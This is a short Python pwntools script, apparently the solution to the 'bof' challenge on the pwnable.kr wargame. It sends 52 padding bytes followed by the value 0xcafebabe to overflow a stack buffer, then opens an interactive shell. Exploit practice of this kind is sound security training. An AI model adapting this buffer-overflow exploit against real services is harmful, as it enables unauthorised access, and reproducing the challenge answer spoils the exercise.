from pwn import *; 
p=remote('pwnable.kr',9000)

p.sendline('A'*52 + p32(0xcafebabe))
p.interactive()
